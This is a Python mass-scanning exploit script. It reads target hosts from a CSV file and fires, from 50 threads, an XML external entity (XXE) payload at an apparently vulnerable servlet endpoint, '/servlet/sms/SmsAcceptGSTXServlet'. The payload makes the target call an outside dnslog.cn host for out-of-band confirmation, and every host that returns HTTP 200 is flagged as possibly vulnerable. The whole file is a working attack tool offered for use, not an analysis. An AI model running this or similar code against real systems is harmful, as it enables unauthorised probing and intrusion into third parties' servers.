import sys
import re
import requests
import csv
from concurrent.futures import ThreadPoolExecutor

def exp(host):
    host = re.sub(r"/$", "", host)
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept": "*/* Accept-Encoding: gzip, deflate, br",
        "Content-Type": "text/xml"
    }
    data = '''<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM
    "http://tcmy3z.dnslog.cn">]><r><a>&sp;</a ></r>'''
    vulurl = url + "/servlet/sms/SmsAcceptGSTXServlet"
    try:
        r = requests.post(vulurl,headers=headers,data=data,verify=False,timeout=10)
        if r.status_code == 200:
            print(f"\033[32m{url} 可能存在[+]\033[0m")
    except:
        return 0

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])